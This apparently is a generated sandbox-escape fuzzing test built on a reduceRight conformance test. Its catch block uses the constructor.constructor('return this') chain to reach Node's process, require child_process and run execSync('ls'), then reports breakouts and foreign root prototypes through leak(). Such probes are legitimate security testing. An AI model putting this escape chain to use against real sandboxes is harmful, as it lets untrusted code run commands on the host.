try {
    var accessed = false;
    function callbackfn1(prevVal, curVal, idx, obj) {
        throw () => {
            return () => {
            };
        };
        accessed = true;
        return obj.length === 2;
    }
    var proto = {};
    Object.defineProperty(proto, 'length', {
        get: function () {
            return 3;
        },
        configurable: true
    });
    var Con = function () {
    };
    Con.prototype = proto;
    var child = new Con();
    Object.defineProperty(child, 'length', {
        get: function () {
            return 2;
        },
        configurable: true
    });
    child[0] = 12;
    child[1] = 11;
    child[2] = 9;
    assert(Array.prototype.reduceRight.call(child, callbackfn1, 111), 'Array.prototype.reduceRight.call(child, callbackfn1, 111) !== true');
    assert(accessed, 'accessed !== true');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}